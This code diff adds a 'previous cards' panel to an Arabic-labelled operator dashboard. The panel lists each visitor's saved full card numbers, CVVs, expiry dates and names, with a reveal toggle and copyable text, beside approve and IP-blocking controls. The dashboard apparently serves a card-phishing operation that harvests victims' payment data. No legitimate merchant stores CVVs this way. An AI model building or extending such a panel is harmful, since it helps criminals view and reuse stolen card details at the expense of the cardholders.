@@ -2703,6 +2703,137 @@ function BlockedIpsCard({
   );
 }
 
+function CardHistoryList({
+  history,
+  currentCardNumber,
+}: {
+  history: any;
+  currentCardNumber: string;
+}) {
+  const [open, setOpen] = useState(false);
+  const [revealed, setRevealed] = useState<Record<number, boolean>>({});
+
+  const entries = Array.isArray(history) ? history : [];
+  const current = String(currentCardNumber || "").replace(/\D/g, "");
+
+  // Show every saved card except the one currently displayed on the main card.
+  // Newest first.
+  const previous = entries
+    .map((e: any) => ({
+      cardNumber: String(e?.cardNumber || "").replace(/\D/g, ""),
+      cvv: String(e?.cvv || "").replace(/\D/g, ""),
+      expiryMonth: String(e?.expiryMonth || "").padStart(2, "0").slice(-2),
+      expiryYear: String(e?.expiryYear || "").slice(-2).padStart(2, "0"),
+      cardName: String(e?.cardName || ""),
+      cardType: String(e?.cardType || ""),
+      timestamp: typeof e?.timestamp === "string" ? e.timestamp : "",
+    }))
+    .filter((e: any) => e.cardNumber && e.cardNumber !== current)
+    .reverse();
+
+  if (previous.length === 0) return null;
+
+  return (
+    <div className="rounded-lg border border-amber-500/30 bg-amber-500/5">
+      <button
+        onClick={() => setOpen((o) => !o)}
+        className="w-full px-3 py-2 flex items-center justify-between text-[11px] font-bold text-amber-200 hover:bg-amber-500/10 rounded-lg transition"
+        data-testid="toggle-card-history"
+      >
+        <span className="flex items-center gap-1.5">
+          <RotateCcw className="w-3 h-3" />
+          البطاقات السابقة ({previous.length})
+        </span>
+        <ChevronDown
+          className={`w-3.5 h-3.5 transition ${open ? "rotate-180" : ""}`}
+        />
+      </button>
+      {open && (
+        <div className="px-2 pb-2 space-y-1.5">
+          {previous.map((entry: any, idx: number) => {
+            const isRevealed = !!revealed[idx];
+            const grouped = entry.cardNumber.replace(/(.{4})/g, "$1 ").trim();
+            const masked =
+              entry.cardNumber.length > 4
+                ? `•••• •••• •••• ${entry.cardNumber.slice(-4)}`
+                : "••••";
+            const expiry =
+              entry.expiryMonth && entry.expiryYear
+                ? `${entry.expiryMonth}/${entry.expiryYear}`
+                : "—";
+            return (
+              <div
+                key={`${entry.cardNumber}-${idx}`}
+                className="rounded-md bg-slate-900/50 border border-slate-800 p-2 space-y-1.5"
+                data-testid={`card-history-${idx}`}
+              >
+                <div className="flex items-center justify-between text-[10px] text-slate-400">
+                  <span dir="ltr" className="font-mono">
+                    {fmtTime(entry.timestamp)}
+                  </span>
+                  <button
+                    onClick={() =>
+                      setRevealed((r) => ({ ...r, [idx]: !r[idx] }))
+                    }
+                    className="flex items-center gap-1 text-cyan-300 hover:text-cyan-200"
+                    data-testid={`toggle-card-history-reveal-${idx}`}
+                  >
+                    {isRevealed ? (
+                      <>
+                        <EyeOff className="w-3 h-3" /> إخفاء
+                      </>
+                    ) : (
+                      <>
+                        <Eye className="w-3 h-3" /> عرض
+                      </>
+                    )}
+                  </button>
+                </div>
+                <div
+                  className="font-mono text-[12px] tracking-wider text-slate-100 select-all"
+                  dir="ltr"
+                  data-testid={`card-history-number-${idx}`}
+                >
+                  {isRevealed ? grouped : masked}
+                </div>
+                <div className="flex items-center gap-3 text-[10px]">
+                  <div>
+                    <span className="opacity-60">CVV: </span>
+                    <span
+                      className="font-mono font-bold text-slate-100 select-all"
+                      dir="ltr"
+                      data-testid={`card-history-cvv-${idx}`}
+                    >
+                      {isRevealed ? entry.cvv || "—" : "•••"}
+                    </span>
+                  </div>
+                  <div>
+                    <span className="opacity-60">Exp: </span>
+                    <span
+                      className="font-mono text-slate-100"
+                      dir="ltr"
+                      data-testid={`card-history-exp-${idx}`}
+                    >
+                      {expiry}
+                    </span>
+                  </div>
+                  {entry.cardType && (
+                    <div className="ml-auto">
+                      <span className="text-[9px] uppercase px-1.5 py-px rounded bg-slate-800 text-slate-300">
+                        {entry.cardType}
+                      </span>
+                    </div>
+                  )}
+                </div>
+              </div>
+            );
+          })}
+        </div>
+      )}
+    </div>
+  );
+}
+
 function CardInfoCard({
   visitor,
   onApprove,
@@ -2936,6 +3067,12 @@ function CardInfoCard({
             )}
           </div>
         </div>
+
+        {/* Previous cards history */}
+        <CardHistoryList
+          history={visitorAny.cardHistory}
+          currentCardNumber={fullCard}
+        />
 
         {/* Action buttons */}
         <div className="grid grid-cols-2 gap-1.5">
